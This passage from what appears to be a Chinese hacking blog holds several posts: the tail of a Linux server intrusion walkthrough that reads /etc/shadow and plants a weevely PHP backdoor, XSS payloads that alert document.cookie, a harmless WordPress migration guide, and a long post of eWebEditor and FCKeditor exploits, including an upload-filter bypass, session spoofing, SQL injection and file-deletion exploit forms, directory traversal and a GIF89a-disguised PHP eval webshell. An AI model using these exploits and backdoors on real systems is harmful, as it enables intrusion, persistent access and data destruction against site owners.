<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034235Hjp.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034235Hjp.png" alt="Linux服务器提权" title="37"></a><br>现在我们可以查看/etc/shadow文件<br><strong>cat /etc/shadow</strong><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034256AXA.jpg" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034256AXA.jpg" alt="linux基础命令" title="38"></a><br>查看/etc/passwd 文件</p>
<p><strong>cat /etc/passwd</strong><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034321dUi.jpg" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034321dUi.jpg" alt="linux基础命令" title="39"></a><br>我们可以使用”john the ripper”工具破解所有用户的密码.但是我们不会这样做，我们需要在这个服务器上留下后门以方便我们在任何时候访问它.</p>
<p>我们用weevely制作一个php小马上传到服务器上.</p>
<p>1.weevely使用选项<br><strong>root@bt:/pentest/backdoors/web/weevely# ./main.py -</strong></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034329JUB.jpg" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034329JUB.jpg" alt="weevely使用方法" title="40"></a></p>
<p>2.用weevely创建一个密码为koko的php后门</p>
<p><strong>root@bt:/pentest/backdoors/web/weevely# ./main.py -g -o hax.php -p koko</strong></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034352PkW.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034352PkW.png" alt="weevely使用方法" title="41"></a></p>
<p>接下来上传到服务器之后来使用它<br><strong>root@bt:/pentest/backdoors/web/weevely# ./main.py -t -u <a href="http://hack-test.com/Hackademic_RTB1/wp-content/plugins/hax.php" target="_blank" rel="external">http://hack-test.com/Hackademic_RTB1/wp-content/plugins/hax.php</a> -p koko</strong></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034402HWa.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034402HWa.png" alt="weevely使用方法" title="42"></a><br>测试我们的hax.php后门</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034426dWE.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034426dWE.png" alt="weevely使用方法" title="43"></a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Hack/">Hack</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-386" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/02/16/386/" class="article-date">
  	<time datetime="2013-02-15T22:37:24.000Z" itemprop="datePublished">2013-02-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/02/16/386/">二哥XSS教学宝典学习</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="第一章">第一章</h2><p><a href="http://xsst.sinaapp.com/example/1-1.php" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-1.php</a></p>
<p>简单，自己也搞定</p>
<p><a href="http://xsst.sinaapp.com/example/1-1.php?page=%3Cimg%20src=%22http://www.baidu.com/img/baidu_sylogo1.gif%22%3E" target="_blank" rel="external">http://xsst.sinapp.com/example/1-1.php?page=&lt;img src=”http://www.baidu.com/img/baidu_sylogo1.gif”&gt;</a></p>
<h2 id="第二章">第二章</h2><p><a href="http://xsst.sinapp.com/example/1-2.php?page=2;alert(document.cookie" target="_blank" rel="external">http://xsst.sinapp.com/example/1-2.php?page=2;alert(document.cookie)</a>)</p>
<p>构造闭合，参数多了双引号，同样的修改一下，进行闭合。</p>
<p><a href="http://xsst.sinaapp.com/example/1-2.php?page=%22;alert(document.cookie" target="_blank" rel="external">http://xsst.sinapp.com/example/1-2.php?page=”;alert(document.cookie);//</a>;//)</p>
<p>&nbsp;</p>
<p>课后练习题：</p>
<p>第1个，由于过滤了双引号，所以通过编码绕过。</p>
<p><a href="http://xsst.sinaapp.com/example/test1-2.php?page=1%27%2beval%28alert%28document.cookie%29%29%29;//" target="_blank" rel="external">http://xsst.sinaapp.com/example/test1-2.php?page=1%27%2beval%28alert%28document.cookie%29%29%29;//</a></p>
<p>第2个的查看一下，我们可以构造如下闭合，</p>
<p><a href="http://xsst.sinaapp.com/example/test1-2-2.php?page=1" target="_blank" rel="external">http://xsst.sinaapp.com/example/test1-2-2.php?page=1’);alert(document.cookie);//</a><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130216080657.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130216080657.png" alt="QQ20130216080657"></a></p>
<p>第3个</p>
<p><a href="http://xsst.sinaapp.com/example/test1-2-3.php?page=1" target="_blank" rel="external">http://xsst.sinaapp.com/example/test1-2-3.php?page=1’;alalertert(document.cookie);’</a></p>
<h2 id="第三章">第三章</h2><p>html 静态网页传参了，以前都以为是伪静态，我去哦。js的获取地址栏参数以前自己还用过，完全没想到。菜鸟一个啊。</p>
<p><a href="http://xsst.sinaapp.com/example/1-3.htm?url=./iframe.htm" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-3.htm?url=./iframe.htm</a></p>
<p>练习题：</p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=1" target="_blank" rel="external">使用document.write造成的XSS （会被IE拦截,Chrome下参数中&lt;,&gt;被自动编码导致无效）</a></p>
<p>前面没注意 ie，chrome均不成功，别说这些了，火狐safari，opera均没弹窗</p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=1&amp;url=" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-3-2.php?bug=1&amp;url=’&gt;&lt;img src=’1’ onerror=’alert(document.cookie)’&gt;&lt;/img&gt;</a></p>
<p>&nbsp;</p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=2&amp;url={age:20,name:" target="_blank" rel="external">使用eval造成的XSS</a></p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=2&amp;url={age:0,name:(function(" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-3-2.php?bug=2&amp;url={age:0,name:(function(){alert(document.cookie)})()}</a>{alert(document.cookie)})()})</p>
<p>&nbsp;</p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=3" target="_blank" rel="external">使用innerHTML造成的XSS （会被IE拦截,Chrome下参数中&lt;,&gt;被自动编码导致无效）</a></p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=3&amp;url=" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-3-2.php?bug=3&amp;url=’&gt;&lt;img src=’1’ onerror=’alert(document.cookie)’&gt;&lt;/img&gt;</a></p>
<p>&nbsp;</p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=4" target="_blank" rel="external">使用location/location.href/location.replace/iframe.src造成的XSS</a></p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=4&amp;url=javascript:alert(document.cookie" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-3-2.php?bug=4&amp;url=javascript:alert(document.cookie);</a>;)</p>
<p>&nbsp;</p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=5&amp;url=www.baidu.com" target="_blank" rel="external">使用setTimeout/setInterval造成的XSS</a></p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=5&amp;url=" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-3-2.php?bug=5&amp;url=’);alert(document.cookie);eval(‘</a></p>
<p>&nbsp;</p>
<p>wooyun上dom xss</p>
<p><a href="http://www.wooyun.org/tags/dom%E7%B1%BB%E5%9E%8Bxss" target="_blank" rel="external">http://www.wooyun.org/tags/dom%E7%B1%BB%E5%9E%8Bxss</a></p>
<p>最后可以看这里的，比较新哦html5安全相关。</p>
<p><a href="http://html5sec.org/" target="_blank" rel="external">http://html5sec.org/</a></p>
<p>&nbsp;</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Hack/">Hack</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-378" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/02/09/378/" class="article-date">
  	<time datetime="2013-02-09T19:55:58.000Z" itemprop="datePublished">2013-02-09</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/02/09/378/">迁移wordpress/网站搬家同时更改URL更改域名</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="无缘无故白屏了，也不知道怎么解决，然后就只能重新安装一下。数据库和附件也给整理了一下，比较麻烦的说。这里是网上找到的一篇文章，mark吧。">无缘无故白屏了，也不知道怎么解决，然后就只能重新安装一下。数据库和附件也给整理了一下，比较麻烦的说。这里是网上找到的一篇文章，mark吧。</h3><h3 id="步骤1：备份数据库"><strong>步骤1：备份数据库</strong></h3><div><br><br>登陆到phpMyAdmin，到mysql后台，选择wordpress数据所在的数据库，点击“导出”或是英文的”Export”把数据库数据备份到你本地。建议选择导出格式为SQL。如果数据量较大，建议在导出页面下方选择.zip或.gzip压缩格式，这样文件会小一些。<br><br><strong>步骤2：备份wordpress网站所有文件</strong><br>用FTP或你的空间商提供的方式吧所有wordpress的文件备份到你本地。建议压缩后再FTP到本地，这样速度快，也不会出现文件传输过程中发生的某些传输错误造成文件不完整。<br><br><strong>步骤3：恢复数据库到你的新空间</strong><br>登陆到你的新空间的phpMyAdmin，到mysql后台，点击“导入”或是英文的“Import”把数据库恢复到你的新空间，即导入步骤1备份的文件。<br><br><strong>步骤4：恢复网站文件到你的新空间</strong><br>用FTP或你的空间商提供的方式把所有的网站文件上传的你的新空间。即导入步骤2备份的文件。<br><br><strong>步骤5：更改配置文件wp-config.php</strong><br>wp-config.php位于根目录，你至少需要修改如下项目：（这些项目买空间是，空间商会给你）<br><br><em>   <a href="http://totem.co/tag/wordpress-2" title="查看 WordPress 中的全部文章" target="_blank" rel="external">WordPress</a> 数据库的名称
</em>   MySQL 数据库用户名<br><em>   MySQL 数据库密码
</em>   MySQL 主机 — 这项通常是 ‘localhost’<br><span style="color: #ff0000;">如果白屏的话，删除config这个文件，然后再来安装一遍，让它自动生成。主题插件也移除掉。</span><br><strong>步骤6：注意检查文件.htaccess</strong><br>（如果你的网站路径与迁移前的一模一样，这一步可以省略）这一步一定要注意，RewriteBase及RewriteRule这两项一定要设置正确。我的网站根路径于原先的不同，这里又没设置正确才发生500错误。<br><br><strong>步骤7：后台数据库修改siteurl及home项</strong><br>（如果你的网站路径及URL与迁移前的一模一样，这一步可以省略），登陆到你的新空间的phpMyAdmin，在后台数据库里修改你的siteurl，找到表wp_options，作如下修改：<br><br><em>   找到option_id字段值为1，option_name字段值为siteurl的记录，修改option_value字段值，比如原先你的值为<a href="http://www.wnshare.com/blog，当前已经变为http://www.wnshare.com，把这个值改为http://www.wnshare.com。" target="_blank" rel="external">http://www.wnshare.com/blog，当前已经变为http://www.wnshare.com，把这个值改为http://www.wnshare.com。</a>
</em>   找到option_id字段值为37，option_name字段值为home的记录，修改option_value字段值，跟上面的是一样的，比如原先你的值为<a href="http://www.wnshare.com/blog，当前已经变为http://www.wnshare.com，把这个值改为http://www.wnshare.com。" target="_blank" rel="external">http://www.wnshare.com/blog，当前已经变为http://www.wnshare.com，把这个值改为http://www.wnshare.com。</a><br><strong>步骤8：到你的<a href="http://totem.co/tag/%e5%9f%9f%e5%90%8d" title="查看 域名 中的全部文章" target="_blank" rel="external">域名</a>注册商网站修改A记录</strong><br>新的IP地址在买空间时，空间商会告诉你，别忘了把新的IP地址更新上去，国内的通常1到2小时就会生效。<br><br>### 步骤8：修改数据库<br><br>数据库中可能会有一些文件地址，或者其他什么的需要更改，这时就要用到这个了。<br><br>这个将文中所有的图片地址改掉，当然也可以改其他的。<br><br>UPDATE wp_posts SET post_content = REPLACE( post_content, ‘<a href="http://7xnueu.com1.z0.glb.clouddn.com/2012/01/" target="_blank" rel="external">http://7xnueu.com1.z0.glb.clouddn.com/2012/01/</a>‘, ‘<a href="http://127.0.0.1/" target="_blank" rel="external">http://127.0.0.1/</a>‘ );<br><br></div>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Web/">Web</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-376" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/02/08/376/" class="article-date">
  	<time datetime="2013-02-08T20:21:33.000Z" itemprop="datePublished">2013-02-08</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/02/08/376/">常见的一些编辑器漏洞</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>常见的一些编辑器:ewebeditor ewebeditornet fckeditoreditor southidceditor SouthidcEditor bigcneditor</p>
<p>其实如果大家多关注编辑器的话,会有惊人的发现,尤其是jsp,php版的,一个webshell基本上就是一台服务器啊~~~</p>
<p>一:首先说说最近不断爆洞的ewebeditor</p>
<p>(一)ASP版<br>1:默认管理后台:</p>
<p><a><a href="http://www.test.com/ewebeditor/admin_login.asp" target="_blank" rel="external">http://www.test.com/ewebeditor/admin_login.asp</a></a></p>
<p>后台如果能进入:</p>
<p>可点击样式管理:</p>
<p>standard 拷贝一份(直接修改改不了)</p>
<p>在拷贝的一份里加入图片类型( asa aaspsp ) 然后点预览</p>
<p>在编辑器里点设计 然后直接上传asa大马.</p>
<p>上传后 在代码里可以看到马的位置!</p>
<p>(原理:因为在iis里 网站的属性里 应用程序配置一项 asa扩展名还是用asp.dll来解析的,asp也是 还有 cer cdx )</p>
<p>在cer cdx asa的被删掉 那么马儿就找不到 映射不过去.</p>
<p>可以在拷贝过后的样式 图片类型里加入 aaspsp 然后在上传 直接就可以上传asp文件<br>2:下载默认数据库</p>
<p><a>www.test.com/ewebeditor/db/ewebeditor.mdb</a></p>
<p>然后分析数据库</p>
<p>webeditor_system(1) 就可以看到用户名和密码 如果破解不出来</p>
<p>可以在webeditor_style(14 样式表里</p>
<p>主要看允许上传文件的扩展名(s-fileext s_ingeext)</p>
<p>看到一个小黑客曾经搞过 多了asa aaspsp</p>
<p>可以用他来利用!(后台找不到的情况下也可以用此方法)</p>
<p>可以构造语句:</p>
<p>比如 ID=46 s-name =standard1</p>
<p>构造 代码: ewebeditor.asp?id=content&amp;style=standard</p>
<p>ID和和样式名改过后</p>
<p>ewebeditor.asp?id=46&amp;style=standard1<br>然后就是进入编辑器 上传asa 或者asp的 得到webshell</p>
<p>前面的1跟2说的是asp版的ewebeditor,其他如php,jsp跟asp的差不多,这里不多说.</p>
<p>针对这种方法可能出现的问题:</p>
<p>(1)．使用默认用户名和密码无法登录。<br>请试试直接下载db目录下的ewebeditor.mdb文件，用户名和密码在eWebEditor_System表中，经过了md5加密，如果无法下载或者无法</p>
<p><em>**</em>，那就当自己的运气不好了。<br>(2)．加了asa类型后发现还是无法上传。<br>应该是站长懂点代码，自己修改了Upload.asp文件，但是没有关系，按照常人的思维习惯，往往会直接在sAllowExt = Replace</p>
<p>(UCase(sAllowExt), “ASP”, “”)一句上修改，我就看见过一个站长是这样修改的：<br>sAllowExt = Replace(Replace(Replace(Replace(Replace(UCase(sAllowExt), “ASP”, “”), “CER”, “”), “ASA”, “”), “CDX”, “”),</p>
<p>“HTR”, “”)<br>猛一看什么都过滤了，但是我们只要在上传类型中增加“aaspsp”，就可以直接上传asp文件了。呵呵，是不是天才的想法？“aaspsp</p>
<p>”过滤了“asp”字符后，反而变成了“asp”！顺便告诉大家一个秘密，其实动网论坛7.0 sp2中也可以利用类似的方法绕过对扩展名</p>
<p>的过滤。<br>(3)．上传了asp文件后，却发现该目录没有运行脚本的权限。<br>呵呵，真是好笨啊，上传类型可以改，上传路径不是也可以修改的吗？</p>
<p>(4)．已经使用了第2点中的方法，但是asp类型还是无法上传。<br>看来站长肯定是一个写asp的高手，但是我们还有最后一招来对付他：看到“远程类型”了吗？eWebEditor能够设定自动保存远程文件</p>
<p>的类型，我们可以加入asp类型。但是如何才能让远程访问的asp文件能够以源码形式保存呢？方法是很多的，最简单的方法是将IIS中</p>
<p>的“应用文件映射”中的“asp”删除。</p>
<p>漏洞原理<br>漏洞的利用原理很简单，请看Upload.asp文件：<br>任何情况下都不允许上传asp脚本文件<br>sAllowExt = Replace(UCase(sAllowExt), “ASP”, “”)<br>因为eWebEditor仅仅过滤了ASP文件。记得我第一次使用eWebEditor时就在纳闷：既然作者已经知道asp文件需要过滤，为什么不同时</p>
<p>过滤asa、cer等文件呢？也许这就是对免费用户不负责任的表现吧！</p>
<p>3.eWebEditor session欺骗漏洞</p>
<p>eWebEditor在线编辑器</p>
<p>漏洞文件:Admin_Private.asp</p>
<p>漏洞语句:&lt;%</p>
<p>If Session(“eWebEditor_User”) = “” Then</p>
<p>Response.Redirect “admin_login.asp”</p>
<p>Response.End</p>
<p>End If</p>
<p>只判断了session，没有判断cookies和路径的验证问题。</p>
<p>漏洞利用:</p>
<p>新建一个h4x0r.asp内容如下:</p>
<p>&lt;%Session(“eWebEditor_User”) = “11111111”%&gt;</p>
<p>访问h4x0r.asp，再访问后台任何文件，for example:Admin_Default.asp</p>
<p>漏洞影响:虚拟主机的克星.</p>
<p>4.ewebeditor asp版 2.1.6 上传漏洞</p>
<p>&lt;H1&gt;ewebeditor asp版 2.1.6 上传漏洞利用程序&lt;/H1&gt;&lt;br&gt;</p>
<p>&lt;form action=”<a><a href="http://127.1/e/upload.asp?action=save&amp;type=IMAGE&amp;style=luoye" target="_blank" rel="external">http://127.1/e/upload.asp?action=save&amp;type=IMAGE&amp;style=luoye</a>‘</a> union select</p>
<p>S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%</p>
<p>2b’|cer’,S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl</p>
<p>from ewebeditor_style where s_name=’standard’and’a’=’a” method=post name=myform enctype=”multipart/form-data”&gt;</p>
<p>&lt;input type=file name=uploadfile size=100&gt;&lt;br&gt;&lt;br&gt;</p>
<p>&lt;input type=submit value=Fuck&gt;</p>
<p>&lt;/form&gt;</p>
<p><a><a href="http://127.1/e/upload.asp" target="_blank" rel="external">http://127.1/e/upload.asp</a></a></p>
<p>上传时修改此处上传地址。。。</p>
<p>如果你是上传的asp文件则成功后的地址为：</p>
<p><a><a href="http://127.1/e/uploadfile/xxxxxxxxxx.asp" target="_blank" rel="external">http://127.1/e/uploadfile/xxxxxxxxxx.asp</a></a></p>
<p>5.ewebeditor遍历路径漏洞<br>Ewebeditor为非常常见的网站核心程序,<br>默认数据库为 /db/ewebeditor.mdb 默认路径admin_login.asp 默认管理员admin密码admin(admin888)</p>
<p>ewebedit进入后台添加样式.得到webshell很容易. 有时候很不幸.管理员把数据库改为只读权限.</p>
<p>但是ewebeditor后台有个小小的缺陷. 可以历遍整个网站目录. 当然.数据库为只读的时候一样可以利用.</p>
<p>上传文件管理—选择样式目录(随便选一个目录)<br>得到:<br>ewebeditor/admin_uploadfile.asp?id=14<br>在id=14后面添加&amp;dir=..<br>再加 &amp;dir=../..<br>&amp;dir=../../../.. 看到整个网站文件了</p>
<p>6.eweb2.7版本以下又一个注入</p>
<p>首先看代码(ewebeditor.asp)：<br>ub InitPara()<br>‘ 取全屏标志<br>sFullScreen = Trim(Request.QueryString(“fullscreen”))<br>‘ 取对应的内容ID<br>sContentID = Trim(Request.QueryString(“id”))<br>If sContentID = “” Then ShowErr “请传入调用参数ID，即隐藏的内容表单项ID！”</p>
<p>‘ 取样式初始值<br>sStyleName = Trim(Request.QueryString(“style”))<br>If sStyleName = “” Then sStyleName = “standard”</p>
<p>sSql = “select * from ewebeditor_style where s_name=’” &amp; sStyleName &amp; “‘“<br>oRs.Open sSql, oConn, 0, 1<br>If Not oRs.Eof Then<br>sStyleID = oRs(“S_ID”)<br>sStyleName = oRs(“S_Name”)<br>sStyleDir = oRs(“S_Dir”)<br>sStyleCSS = oRs(“S_CSS”)<br>sStyleUploadDir = oRs(“S_UploadDir”)<br>nStateFlag = oRs(“S_StateFlag”)<br>sDetectFromWord = oRs(“S_DetectFromWord”)<br>sInitMode = oRs(“S_InitMode”)<br>sBaseUrl = oRs(“S_BaseUrl”)</p>
<p>sStyleUploadDir = Replace(sStyleUploadDir, “\”, “/“)<br>If Right(sStyleUploadDir, 1) &lt;&gt; “/“ Then<br>sStyleUploadDir = sStyleUploadDir &amp; “/“<br>End If<br>Else<br>ShowErr “无效的样式Style参数传入，如果要使用默认值，请留空！”<br>End If<br>oRs.Close<br>关键的是这两句：<br>sStyleName = Trim(Request.QueryString(“style”))<br>If sStyleName = “” Then sStyleName = “standard”</p>
<p>sSql = “select * from ewebeditor_style where s_name=’” &amp; sStyleName &amp; “‘“<br>很明显的是style参数没有足够的过滤，如果我们自己给这个地方赋值的话，程序会报错的，</p>
<p>但接下来的一句还是让我们有可乘之机，If sStyleName = “” Then sStyleName = “standard”保留默认的还是会带入语句执行，加个</p>
<p>单引号就报错了，如图2.[local]1[/local]<br>我试了好几款工具，发现只有pangolin可以注入，啊D只能发现注入不能继续猜解。<br>eweb默认的管理员表是：ewebeditor_system<br>这个表下的默认两个列名为:sys_UserName和sys_userpass<br>需要手动添加，</p>
<p>7.ewebeditor2.8最终版删除任意文件漏洞</p>
<p>这个漏洞可以很鸡肋，也可以很致命，关键看你怎么利用！</p>
<p>此漏洞存在于ExampleNewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入，看这些代码：</p>
<p>‘ 把带”|”的字符串转为数组<br>Dim aSavePathFileName<br>aSavePathFileName = Split(sSavePathFileName, “|”)<br>‘ 删除新闻相关的文件，从文件夹中<br>Dim i<br>For i = 0 To UBound(aSavePathFileName)<br>‘ 按路径文件名删除文件<br>Call DoDelFile(aSavePathFileName(i))<br>Next</p>
<p>而aSavePathFileName是前面从数据库取出来的：</p>
<p>sSavePathFileName = oRs(“D_SavePathFileName”)</p>
<p>看看D_SavePathFileName是怎么添加到数据库里的，在addsave.asp(modifysave.asp)里：</p>
<p>sSavePathFileName = GetSafeStr(Request.Form(“d_savepathfilename”))<br>…<br>oRs(“D_SavePathFileName”) = sSavePathFileName</p>
<p>居然过滤了，是GetSafeStr函数，再看看这个函数，在Startup.asp里：</p>
<p>Function GetSafeStr(str)<br>GetSafeStr = Replace(Replace(Replace(Trim(str), “‘“, “”), Chr(34), “”), “;”, “”)<br>End Function</p>
<p>无语，这不是过滤字符型注入的函数么？放这里什么用也没有啊！既然路径没有过滤，那就可以直接定义了，构造一个提交页面，其</p>
<p>中d_savepathfilename自己任意赋值(要删除多个文件，用|隔开即可)。试试../../eWebEditor.asp，提交后删除该新闻，于是主目录</p>
<p>下的eWebEditor.asp不见了！</p>
<p>下面给出利用的htm：<br>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;eWebEditor删除文件 by:oldjun(<a><a href="http://www.oldjun.com)&lt;/TITLE" target="_blank" rel="external">http://www.oldjun.com)&lt;/TITLE</a></a>&gt;<br>&lt;style&gt;body,p,td,input {font-size:9pt}&lt;/style&gt;<br>&lt;/HEAD&gt;&lt;BODY&gt;&lt;a href=’list.asp’&gt;新闻列表&lt;/a&gt; | &lt;a href=’add.asp’&gt;增加新闻&lt;/a&gt;</p>
<p>&lt;b&gt;增加新闻&lt;/b&gt;</p>
<p>&lt;form action=”<a><a href="http://127.0.0.1/editor/Example/NewsSystem/addsave.asp" target="_blank" rel="external">http://127.0.0.1/editor/Example/NewsSystem/addsave.asp</a></a>“<br>method=”post” name=”myform”&gt;<br>&lt;input type=hidden name=d_nofilename&gt;<br>&lt;input type=hidden name=d_savefilename&gt;<br>&lt;table cellspacing=3 align=center&gt;<br>&lt;tr&gt;&lt;td&gt;要删的文件(相对路径就可以了)：&lt;/td&gt;<br>&lt;td&gt;&lt;input type=”text” name=”d_savepathfilename” value=”” size=”90”&gt;&lt;/td&gt;<br>&lt;/tr&gt;<br>&lt;tr&gt;&lt;td&gt;新闻标题(随便填)：&lt;/td&gt;<br>&lt;td&gt;&lt;input type=”text” name=”d_title” value=”” size=”90”&gt;&lt;/td&gt;<br>&lt;/tr&gt;<br>&lt;tr&gt;&lt;td&gt;标题图片：&lt;/td&gt;<br>&lt;td&gt;&lt;select name=”d_picture” size=1&gt;&lt;option value=’’&gt;无&lt;/option&gt;&lt;/select&gt;<br>当编辑区有插入图片时，将自动填充此下拉框&lt;/td&gt;<br>&lt;/tr&gt;<br>&lt;tr&gt;&lt;td&gt;新闻内容(随便填)：&lt;/td&gt;<br>&lt;td&gt;&lt;textarea name=”d_content”&gt;&lt;/textarea&gt;&lt;/td&gt;<br>&lt;/tr&gt;<br>&lt;/table&gt;</p>
<p>&lt;input type=submit name=btnSubmit value=” 提 交 “&gt;<br>&lt;input type=reset name=btnReset value=” 重 填 “&gt;<br>&lt;/form&gt;<br>&lt;/BODY&gt;&lt;/HTML&gt;</p>
<p>(二)ASPX版：</p>
<p>受影响文件：eWebEditorNet/upload.aspx</p>
<p>利用方法：添好本地的cer的Shell文件。在浏揽器输入javascript:lbtnUpload.click();就能得到shell</p>
<p>嘿嘿….绕过了限制……成功的上传了ASPX文件….</p>
<p>文件默认的上传后保存的地址是eWebEditorNet/UploadFile/现在来看看是否上传成功…..</p>
<p>(三)PHP版</p>
<p>关于eWebEditor 漏洞php版本的和asp的一样。有目录浏览。和编辑扩展名。重点在于虽然支持了php格式但上传还是上传不了。不过</p>
<p>利用织梦的gif89a漏洞倒可以实现php一句话上传，然后再上传webshell。</p>
<p>备注：织梦的gif89a漏洞，准确来说应该是DEDECMS中所用的php版的FCKeditor存在上传漏洞，gif89a文件头欺骗。DEDECMS中在上传</p>
<p>拖上没有对picSubmit进行任何处理。但是却不能直接上传php马。因为会识别。使用修改过的php小马。</p>
<p>gif89a</p>
<p>&lt;?php</p>
<p>phpinfo();</p>
<p>?&gt;</p>
<p>RFI</p>
<p>gif89a</p>
<p>&lt;?php</p>
<p>eval($_POST[c]);</p>
<p>?&gt;</p>
<p>利用gif89a进行了欺骗。现在上传就可以成功了.然后有php一句话客户端连接.</p>
<p>(四)JSP版</p>
<p>上传漏洞</p>
<p>影响版本：漏洞存在于ewebeditor jsp版 1.4以下版本，漏洞有两个版本。</p>
<p>原理：第一个是使用savefile.jsp来进行文件上传操作的，从代码中可以看出，程序并没做任何上传过滤，这样我们就可以直接上传</p>
<p>一个JSPShell了。另一个版本可能是被人修改过，把代码转成了servlet，不能看到代码，但是利用方法却大同小异。</p>
<p>利用方法：我们先找一个1.4版本以下的ewebeditor JSP上传页面，选择好一个JSPShell。这个ewebeditor是没有提交按钮的，所以这</p>
<p>里涉及到一个小技巧，就是在上传的对话框中敲下回车，大约过半分钟，就可以查看网页的源文件来寻找我们的Webshell了。</p>
<p>这个JSP和PHP一样,如果系统权限没有特意去设置的话,默认我们得到webshell是system的权限,那么…^_^</p>
<p>二:ewebeditornet 漏洞利用</p>
<p>默认上传地址:</p>
<p><a>www.test.com/ewebeditornet/upload.aspx</a><br>可以直接上传一个cer的木马</p>
<p>在无法上传的情况下</p>
<p>可以地址栏构造以下代码: javascript:lbtnUpload.click();</p>
<p>然后查看源代码:</p>
<p>找到uploadsave 找到地址</p>
<p>默认传到uploadfile这个文件夹里</p>
<p>(漏洞修补: 可以在iss里直接把upload文件夹的执行权限选择无. )</p>
<p>三:fckeditor 漏洞利用</p>
<p><a><a href="http://www.test.com/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp" target="_blank" rel="external">http://www.test.com/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp</a></a>?</p>
<p>Command=FileUpload&amp;Type=Image&amp;CurrentFolder=/<br>就把文件名字段改成NEWfile 选择文件名可定义<br>上传过后在/userfiles/image/找文件</p>
<p>上传任意文件:</p>
<p>fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp</p>
<p>根据网站所使用不同语言自己改这个地址.</p>
<p>FCKeditor的JSP版漏洞</p>
